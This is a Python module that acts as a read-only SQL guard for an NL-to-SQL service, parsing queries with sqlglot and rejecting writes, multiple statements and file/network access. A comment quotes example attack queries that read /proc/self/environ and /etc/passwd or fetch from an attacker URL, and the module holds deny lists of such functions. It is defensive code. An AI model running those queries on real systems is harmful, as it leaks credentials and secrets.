"""guard.py — sqlglot-based, dialect-aware, read-only SQL guard (NEW module;
docs/PYTHON_NL2SQL_SERVICE_PLAN.md §1.3, §3.1 `sqltools/guard.py`, §3.2).

This is the Python counterpart the plan recommends as the AUTHORITATIVE
generation-time guard, replacing `lib/sqlGuard.ts`'s hand-written character
tokenizer with a real, dialect-aware SQL parser (`sqlglot`, which — unlike
the parser TS considered and rejected — supports duckdb/postgres/trino). It
is intended to be shared by:

  - the future NL->SQL service's self-repair loop (the `[E] guardSql` step
    `lib/rag/generate.ts` runs today),
  - prep's own exemplar validation (`prep/prep/exemplars.py`, which marks
    exemplars `validated: true`),
  - the eval scorer (once ported, plan §4.1).

`lib/sqlGuard.ts` and its TS `/api/query` re-guard call STAY as-is (plan
§1.3) — this module does not replace that execution-time boundary layer, it
adds a stronger generation-time layer ahead of it. Read-only enforcement
after this module exists is: DB read-only role (primary) -> this guard
(generation-time, sqlglot AST) -> TS tokenizer guard (execution-time
re-guard, unchanged) -> bundle known-tables allowlist.

── SEMANTICS MIRRORED FROM lib/sqlGuard.ts ──────────────────────────────────
  * Allowed leading statement types: SELECT, WITH, EXPLAIN (incl. ANALYZE),
    SHOW, DESCRIBE/DESC.
  * Multiple statements (any non-trailing `;`) are rejected.
  * A `WITH` must resolve to a SELECT and must not contain a write/DDL verb
    ANYWHERE in its body — including inside a CTE (`WITH x AS (DELETE ...)
    SELECT * FROM x`), which a leading-keyword-only classifier would miss.
    sqlglot gives us a real AST to walk for this, which is strictly stronger
    than the TS tokenizer's regex-over-text check for the same case.
  * Comments (line `--` and block `/* */`) never affect classification (a
    leading comment before DELETE must not smuggle it past the guard — this
    was the literal B1 bypass `lib/sqlGuard.ts`'s docstring documents).
  * A string literal containing `;` or comment-like text must not be treated
    as a statement separator or comment.

── WHY A REAL PARSER HERE (UNLIKE lib/sqlGuard.ts) ──────────────────────────
`lib/sqlGuard.ts`'s docstring explains TS avoided a real parser because
node-sql-parser has no Trino dialect and would false-reject valid Trino
constructs. `sqlglot` DOES support `duckdb`, `postgres`, AND `trino`
dialects natively, so that objection does not apply here — real dialect-aware
parsing is strictly stronger than leading-keyword classification (SPEC
document plan §1.3, §3.2).
"""

from __future__ import annotations

import logging
import re
from dataclasses import dataclass

import sqlglot
from sqlglot import expressions as exp
from sqlglot.errors import ParseError, TokenError

from ceiba_nl2sql.sqltools.dialect import normalize_dialect

# sqlglot logs a WARNING ("... contains unsupported syntax. Falling back to
# parsing as a 'Command'.") whenever a statement it cannot build a typed node
# for falls back to the generic `Command` passthrough — which is the EXPECTED
# and explicitly handled path here for EXPLAIN/SHOW/CALL/EXECUTE on
# postgres/trino (see `_root_type_name_for_reporting` / `guard_sql` below).
# This is not an error condition for this module, so the noisy default
# warning is silenced at import time rather than on every `guard_sql` call.
logging.getLogger("sqlglot").setLevel(logging.ERROR)

# ── allow / deny vocabularies ────────────────────────────────────────────────

# Leading statement types permitted to reach the engine. All are read-only.
# Keys are the upper-cased "statement type" this guard reports in
# `GuardResult.statement_type` — chosen to line up 1:1 with
# lib/sqlGuard.ts's `ALLOWED_STATEMENT_TYPES` strings.
_ALLOWED_STATEMENT_TYPES = frozenset({"SELECT", "WITH", "EXPLAIN", "SHOW", "DESCRIBE", "DESC"})

# Precise, auditable reason strings for the common dangerous verbs — mirrors
# lib/sqlGuard.ts `KNOWN_WRITE_TYPES`, expressed as sqlglot AST node types
# instead of leading keywords so a write verb buried inside a CTE body (not
# just at the statement root) is caught by the same walk.
_WRITE_OR_DDL_EXPRESSION_TYPES: tuple[type, ...] = (
    exp.Insert,
    exp.Update,
    exp.Delete,
    exp.Merge,
    exp.Drop,
    exp.Alter,
    exp.Create,
    exp.TruncateTable,
    exp.Grant,
)

# `Command`-keyword denylist: statements sqlglot cannot parse into a typed
# node at all (CALL, EXECUTE, PREPARE, DEALLOCATE, SET, USE, transaction
# control, REVOKE on some dialects, COMMENT, ANALYZE/REFRESH as DDL-ish
# maintenance ops) — these surface as `Command`/other passthrough nodes whose
# leading keyword we still classify explicitly, matching lib/sqlGuard.ts
# `KNOWN_WRITE_TYPES` verbatim so the reason string names the actual verb.
_KNOWN_WRITE_COMMAND_KEYWORDS = frozenset(
    {
        "INSERT",
        "UPDATE",
        "DELETE",
        "MERGE",
        "DROP",
        "ALTER",
        "CREATE",
        "TRUNCATE",
        "RENAME",
        "CALL",
        "EXECUTE",
        "PREPARE",
        "DEALLOCATE",
        "GRANT",
        "REVOKE",
        "DENY",
        "SET",
        "RESET",
        "USE",
        "START",
        "BEGIN",
        "COMMIT",
        "ROLLBACK",
        "SAVEPOINT",
        "COMMENT",
        "ANALYZE",
        "REFRESH",
    }
)

# ── filesystem / network table-function denylist (P1 SECURITY) ────────────────
#
# Even a syntactically read-only SELECT can exfiltrate secrets or SSRF an
# internal endpoint via a DuckDB filesystem/network TABLE FUNCTION:
#   SELECT * FROM read_csv('/proc/self/environ')       -> leaks OPENAI_API_KEY,
#   SELECT * FROM read_parquet('http://attacker/…')       NL2SQL_SERVICE_TOKEN,
#   SELECT read_text('/etc/passwd')                        DSNs, or SSRFs.
# The engine now disables external access at runtime (duckdb_engine.py
# `_harden`), but this guard rejects these BEFORE they ever reach an engine, at
# generation time, so the self-repair loop never even proposes such SQL. The
# names are matched case-insensitively against every function node in the AST
# (typed ReadCSV/ReadParquet plus generic Anonymous funcs) AND via a lexical
# fallback (belt-and-suspenders, in case a future/dialect grammar hides the
# call from the AST walk).
_FILESYSTEM_NETWORK_FUNCTIONS = frozenset(
    {
        "READ_CSV",
        "READ_CSV_AUTO",
        "READ_PARQUET",
        "PARQUET_SCAN",
        "READ_JSON",
        "READ_JSON_AUTO",
        "READ_NDJSON",
        "READ_NDJSON_AUTO",
        "READ_JSON_OBJECTS",
        "READ_TEXT",
        "READ_BLOB",
        "GLOB",
        "READ_CSV_MULTI",
        "SNIFF_CSV",
        "DELTA_SCAN",
        "ICEBERG_SCAN",
        "READ_XLSX",
    }
)

# Statement types that touch the filesystem/network or install code even though
# they are not writes to a table: COPY ... TO a path (export), EXPORT DATABASE,
# INSTALL/LOAD an extension (e.g. httpfs, which re-opens HTTP), and a
# `SELECT ... INTO newtable` materialization. Reported with these keywords.
_FILESYSTEM_ROOT_TYPE_TO_KEYWORD: dict[type, str] = {
    exp.Copy: "COPY",
    exp.Export: "EXPORT",
    exp.Install: "INSTALL",
    exp.Pragma: "PRAGMA",
}

# Root node types that are unambiguously write/DDL/transaction-control even
# when sqlglot gives them a proper typed node (not a generic Command) —
# folded into the same reporting path as the keyword denylist above.
_WRITE_ROOT_TYPE_TO_KEYWORD: dict[type, str] = {
    exp.Insert: "INSERT",
    exp.Update: "UPDATE",
    exp.Delete: "DELETE",
    exp.Merge: "MERGE",
    exp.Drop: "DROP",
    exp.Alter: "ALTER",
    exp.Create: "CREATE",
    exp.TruncateTable: "TRUNCATE",
    exp.Grant: "GRANT",
    exp.Revoke: "REVOKE",
    exp.Set: "SET",
    exp.Transaction: "BEGIN",
    exp.Commit: "COMMIT",
    exp.Rollback: "ROLLBACK",
}


@dataclass(frozen=True)
class GuardResult:
    """Result of classifying a SQL string. CHECK `allowed` first. Mirrors the
    shape of lib/sqlGuard.ts's `SqlGuardResult`.
    """

    allowed: bool
    reason: str | None = None
    statement_type: str | None = None


TableAllowlistCheck = "Callable[[str, str | None, str | None], tuple[bool, str | None]]"


def _default_table_allowlist(sql: str, catalog: str | None, schema: str | None) -> tuple[bool, str | None]:
    """Default table-allowlist policy: allow everything (permissive seam,
    mirrors lib/sqlGuard.ts `allowAllTables`).
    """
    return True, None


def _root_type_name_for_reporting(node: exp.Expression) -> str | None:
    """Best-effort leading-keyword string for a parsed root node, used only
    for the `statement_type` field / error messages — mirrors the strings
    lib/sqlGuard.ts's `leadingKeyword` would have produced.
    """
    if isinstance(node, exp.Command):
        token = node.this
        return str(token).upper() if token else None
    if isinstance(node, exp.Describe):
        return "DESCRIBE"
    if isinstance(node, exp.Show):
        return "SHOW"
    if isinstance(node, (exp.Select, exp.Union, exp.Subquery)):
        # A `WITH ... SELECT` parses with `.this`/ctes on the Select node
        # itself in sqlglot (no separate top-level With wrapper node), so we
        # detect "WITH" by presence of a `with_` clause rather than node type.
        if node.args.get("with"):
            return "WITH"
        return "SELECT"
    for root_type, keyword in _WRITE_ROOT_TYPE_TO_KEYWORD.items():
        if isinstance(node, root_type):
            return keyword
    return type(node).__name__.upper()


def _contains_write_or_ddl(node: exp.Expression) -> str | None:
    """Walk the full AST of `node` and return the first write/DDL/DML verb
    found ANYWHERE in the tree (not just at the root) — this is what makes a
    `WITH x AS (DELETE FROM t RETURNING *) SELECT * FROM x` rejected even
    though sqlglot's top-level node for the whole statement is a `Select`.
    Returns `None` if no write/DDL node is found.
    """
    for sub_node in node.walk():
        if isinstance(sub_node, _WRITE_OR_DDL_EXPRESSION_TYPES):
            keyword = _WRITE_ROOT_TYPE_TO_KEYWORD.get(type(sub_node))
            if keyword:
                return keyword
            for base_type, kw in _WRITE_ROOT_TYPE_TO_KEYWORD.items():
                if isinstance(sub_node, base_type):
                    return kw
            return type(sub_node).__name__.upper()
        if isinstance(sub_node, exp.Command):
            token = sub_node.this
            keyword = str(token).upper() if token else None
            if keyword in _KNOWN_WRITE_COMMAND_KEYWORDS:
                return keyword
    return None


def _function_name(node: exp.Func) -> str:
    """Best-effort canonical UPPER-CASE name of a function node. `Anonymous`
    (an unrecognized function) carries its name in `.name`; typed funcs
    (ReadCSV, ReadParquet, …) expose it via `sql_name()`.
    """
    if isinstance(node, exp.Anonymous):
        return str(node.name or "").upper()
    try:
        return str(node.sql_name() or "").upper()
    except Exception:  # noqa: BLE001 - defensive: never let name probing crash the guard
        return type(node).__name__.upper()


# Lexical fallback: a filesystem/network function name used as a call
# (`name(` — possibly with whitespace) anywhere in comment-free SQL. Belt-and-
# suspenders behind the AST walk so a construct the parser hides from the walk
# (or a future grammar change) is still caught. Word-boundary + `(` avoids
# tripping on a column literally named `read_csv`.
_FILESYSTEM_FUNCTION_LEXICAL = re.compile(
    r"\b(" + "|".join(sorted(re.escape(name) for name in _FILESYSTEM_NETWORK_FUNCTIONS)) + r")\s*\(",
    re.IGNORECASE,
)
# Statement-level filesystem/extension verbs for the lexical fallback (leading
# keyword or COPY ... TO / EXPORT DATABASE / INSTALL / LOAD an extension).
_FILESYSTEM_STATEMENT_LEXICAL = re.compile(
    r"\b(EXPORT\s+DATABASE|INSTALL|LOAD|COPY)\b",
    re.IGNORECASE,
)


def _find_filesystem_access(root: exp.Expression, raw_sql: str) -> str | None:
    """Return a human-safe keyword if `root` (or the raw SQL, lexical fallback)
    performs filesystem/network access via a table function, COPY ... TO,
    EXPORT DATABASE, INSTALL/LOAD, PRAGMA, or a SELECT ... INTO materialization.
    Returns None otherwise. Rejects these even inside an otherwise-read-only
    SELECT (P1 SECURITY: read_csv/read_parquet exfiltration/SSRF).
    """
    # 1. Statement-root types that are filesystem/extension ops.
    for root_type, keyword in _FILESYSTEM_ROOT_TYPE_TO_KEYWORD.items():
        if isinstance(root, root_type):
            # COPY ... FROM (kind=True) is an INGEST which the read-only DB role
            # blocks anyway; COPY ... TO (kind=False) is the exfiltration path.
            # Reject either — a read-only query never needs COPY at all.
            return keyword

    # 2. `SELECT ... INTO newtable` (Select.into) materializes to a new table.
    for select_node in root.find_all(exp.Select):
        if select_node.args.get("into") is not None:
            return "SELECT INTO"

    # 3. A `Command`/`LOAD`-style passthrough whose leading keyword installs or
    #    loads an extension (re-opening HTTP/filesystem via httpfs, etc.).
    for command in root.find_all(exp.Command):
        token = str(command.this or "").upper()
        if token in {"LOAD", "INSTALL", "EXPORT"}:
            return token

    # 4. Any filesystem/network table FUNCTION anywhere in the tree.
    for func in root.find_all(exp.Func):
        if _function_name(func) in _FILESYSTEM_NETWORK_FUNCTIONS:
            return _function_name(func)

    # 5. Lexical fallback over comment-free SQL (the AST above is authoritative;
    #    this only fires if the parser hid the call from the walk).
    stripped = _strip_sql_comments(raw_sql)
    match = _FILESYSTEM_FUNCTION_LEXICAL.search(stripped)
    if match:
        return match.group(1).upper()
    return None


# ── comment stripping for the lexical fallbacks ──────────────────────────────
#
# The lexical fallbacks (filesystem-function scan + write-verb scan) run over
# comment-free SQL so a verb hidden in a `-- comment` or `/* */` block is not
# treated as present. String literals are preserved (a write verb inside a
# string literal is inert as far as execution goes; the AST walk is what
# decides real statement structure — the lexical scan is only a fail-CLOSED
# backstop, and matching a literal at worst over-rejects, which is safe here).
_LINE_COMMENT = re.compile(r"--[^\n]*")
_BLOCK_COMMENT = re.compile(r"/\*.*?\*/", re.DOTALL)


def _strip_sql_comments(sql: str) -> str:
    return _BLOCK_COMMENT.sub(" ", _LINE_COMMENT.sub(" ", sql))


def _leading_keyword(sql: str) -> str:
    """Upper-cased leading significant keyword of comment-free SQL, skipping
    any leading `(`. Mirrors lib/sqlGuard.ts `leadingKeyword` — used to
    classify a statement by its leading verb when sqlglot's AST root type is
    ambiguous (notably `WITH ... SELECT`).
    """
    stripped = _strip_sql_comments(sql).lstrip()
    while stripped.startswith("("):
        stripped = stripped[1:].lstrip()
    match = re.match(r"[A-Za-z_][A-Za-z0-9_]*", stripped)
    return match.group(0).upper() if match else ""


# Lexical write/DDL-verb fallback (P0-arch): a standalone write verb anywhere in
# comment-free SQL. Mirrors the TS guard's `writeVerbInBody` regex so a CTE
# body like `WITH x AS (SELECT 'DELETE' AS a) ...` is treated the same on both
# runtimes (the TS regex matches the literal DELETE and rejects; this makes
# Python at least as strict). Belt-and-suspenders behind the AST walk.
_WRITE_VERB_LEXICAL = re.compile(
    r"\b("
    + "|".join(
        [
            "INSERT",
            "UPDATE",
            "DELETE",
            "MERGE",
            "CREATE",
            "ALTER",
            "DROP",
            "TRUNCATE",
            "CALL",
            "GRANT",
            "REVOKE",
        ]
    )
    + r")\b",
    re.IGNORECASE,
)


def _lexical_write_verb(sql: str) -> str | None:
    """Fail-closed lexical scan for a write/DDL verb over comment-free SQL,
    matching lib/sqlGuard.ts's WITH-body regex so the Python guard is at least
    as strict as the TS one (P0-arch parity). Returns the matched verb or None.
    """
    match = _WRITE_VERB_LEXICAL.search(_strip_sql_comments(sql))
    return match.group(1).upper() if match else None


def guard_sql(
    sql: str,
    *,
    dialect: str | None = None,
    catalog: str | None = None,
    schema: str | None = None,
    table_allowlist: "TableAllowlistCheck | None" = None,
) -> GuardResult:
    """Classify `sql` and decide whether it is a single read-only statement
    safe to forward to the target engine.

    Order of checks (mirrors lib/sqlGuard.ts `guardSql`):
      1. Non-empty after trimming.
      2. Parse with sqlglot in `dialect` (default: duckdb); a hard parse
         failure is treated as a rejection (fail closed — an unparseable
         statement is never assumed safe).
      3. Exactly one non-empty top-level statement (reject multi-statement).
      4. The statement's leading type is in the read-only allowlist
         (SELECT/WITH/EXPLAIN/SHOW/DESCRIBE/DESC).
      5. If WITH: the body resolves to a SELECT AND no write/DDL verb
         appears anywhere in the statement's AST (catches writes nested
         inside a CTE, not just a top-level write).
      6. (Optional) table-allowlist hook passes (H25 seam, mirrors
         lib/sqlGuard.ts's `tableAllowlist` option). Defaults to permissive.

    This is a QUALITY / GENERATION-TIME gate feeding a self-repair loop, not
    the execution security boundary — the DB-side read-only role is the
    primary control, and the TS `/api/query` re-guard (`lib/sqlGuard.ts`)
    remains the execution-time boundary re-guard (plan §1.3). Both facts are
    intentional and mirror the TS guard's own documented posture.
    """
    if not isinstance(sql, str) or sql.strip() == "":
        return GuardResult(allowed=False, reason="No SQL provided.")

    resolved_dialect = normalize_dialect(dialect)

    try:
        statements = sqlglot.parse(sql, read=resolved_dialect)
    except (ParseError, TokenError) as exc:
        # TokenError is raised during TOKENIZATION (e.g. an unterminated quote
        # from a truncated LLM completion), before ParseError can fire. Both
        # must fail CLOSED — a guard that raises on malformed model output would
        # crash the request instead of rejecting the SQL and triggering repair.
        return GuardResult(allowed=False, reason=f"SQL failed to parse: {exc}")
    except Exception as exc:  # noqa: BLE001 - defensive: any sqlglot internal error must fail closed, never crash the guard
        return GuardResult(allowed=False, reason=f"SQL could not be validated: {type(exc).__name__}")

    # sqlglot returns `None` entries for empty statements (e.g. a trailing
    # `;` or a stray `;;`) and can also emit a bare `Semicolon` separator node
    # when a comment sits between two statements — neither is a real
    # statement, so both are filtered out before counting.
    real_statements = [s for s in statements if s is not None and not isinstance(s, exp.Semicolon)]

    if not real_statements:
        return GuardResult(allowed=False, reason="No executable SQL after stripping comments.")

    if len(real_statements) > 1:
        return GuardResult(
            allowed=False,
            reason="Multiple SQL statements are not allowed. Submit a single read-only query.",
        )

    root = real_statements[0]
    statement_type = _root_type_name_for_reporting(root)

    # sqlglot sometimes types `WITH cte AS (...) SELECT ...` as a plain Select
    # (the CTE binds below the reported root), so the AST-derived
    # `statement_type` can read "SELECT" for a statement whose LEADING keyword
    # is WITH. lib/sqlGuard.ts classifies by leading keyword and applies its
    # write-verb body scan for WITH, so normalize to "WITH" here whenever the
    # raw statement leads with WITH — this keeps the Python guard AT LEAST as
    # strict as the TS one for the `WITH ... SELECT 'DELETE' ...` case (P0-arch).
    if statement_type == "SELECT" and _leading_keyword(sql) == "WITH":
        statement_type = "WITH"

    if not statement_type:
        return GuardResult(allowed=False, reason="Could not identify the SQL statement type.")

    if statement_type not in _ALLOWED_STATEMENT_TYPES:
        is_known_write = (
            statement_type in _KNOWN_WRITE_COMMAND_KEYWORDS
            or statement_type in _WRITE_ROOT_TYPE_TO_KEYWORD.values()
        )
        reason = (
            f"{statement_type} is not permitted. Only read-only queries (SELECT / WITH / "
            "EXPLAIN / SHOW / DESCRIBE) are allowed."
            if is_known_write
            else f"Statement type '{statement_type}' is not permitted. Only read-only queries are allowed."
        )
        return GuardResult(allowed=False, statement_type=statement_type, reason=reason)

    # `Command` nodes (EXPLAIN/SHOW/DESCRIBE on dialects that don't give them
    # a typed node) carry no sub-tree to walk for embedded writes — the
    # keyword check above is already sufficient for those. Only a real
    # parsed `Select`/`Union`/`Subquery`/`Describe`/`Show` node needs the
    # embedded-write walk below (in particular the WITH-CTE case).
    if isinstance(root, exp.Command):
        pass
    elif statement_type == "WITH":
        # The statement must ultimately drive a SELECT (a WITH whose body is a
        # write is a write). sqlglot may bind the CTE below the reported root,
        # so accept either a top-level `with` arg OR a Select node present
        # anywhere in the tree (mirrors the TS guard's `\bSELECT\b` check).
        resolves_to_select = bool(root.args.get("with")) or any(root.find_all(exp.Select))
        if not resolves_to_select:
            return GuardResult(
                allowed=False, statement_type="WITH", reason="A WITH clause must resolve to a SELECT query."
            )
        # AST walk PLUS a lexical fallback: the TS guard's WITH-body regex
        # matches a write verb even inside a string literal (e.g. `WITH x AS
        # (SELECT 'DELETE' AS a) SELECT ...`), so the Python guard applies the
        # same fail-closed lexical scan to stay AT LEAST as strict (P0-arch).
        write_verb = _contains_write_or_ddl(root) or _lexical_write_verb(sql)
        if write_verb:
            return GuardResult(
                allowed=False,
                statement_type="WITH",
                reason="A WITH clause may not contain a write or DDL statement.",
            )
    else:
        # Even a plain SELECT/Union/Subquery/Describe/Show is walked
        # defensively — sqlglot can embed e.g. a subquery-DML dialect
        # extension inside an otherwise-Select tree in future grammar
        # additions; failing closed here costs nothing on the common case.
        write_verb = _contains_write_or_ddl(root)
        if write_verb:
            return GuardResult(
                allowed=False,
                statement_type=statement_type,
                reason=f"{write_verb} is not permitted. Only read-only queries are allowed.",
            )

    # ── P1 SECURITY: reject filesystem/network table functions + COPY/EXPORT/
    #    INSTALL/LOAD/PRAGMA/SELECT INTO, even inside a read-only SELECT. This
    #    runs for EVERY allowed statement type (including a bare SELECT, WITH,
    #    and the Command passthroughs) — a read_csv('/etc/…') hidden in a SELECT
    #    is exactly the bypass this closes.
    filesystem_verb = _find_filesystem_access(root, sql)
    if filesystem_verb:
        return GuardResult(
            allowed=False,
            statement_type=statement_type,
            reason=(
                f"{filesystem_verb} is not permitted: filesystem/network access "
                "(reading local files or remote URLs) is blocked even inside a read-only query."
            ),
        )

    check = table_allowlist or _default_table_allowlist
    allowed, allow_reason = check(root.sql(dialect=resolved_dialect), catalog, schema)
    if not allowed:
        return GuardResult(
            allowed=False,
            statement_type=statement_type,
            reason=allow_reason or "Query references tables outside the allowlist.",
        )

    return GuardResult(allowed=True, statement_type=statement_type)
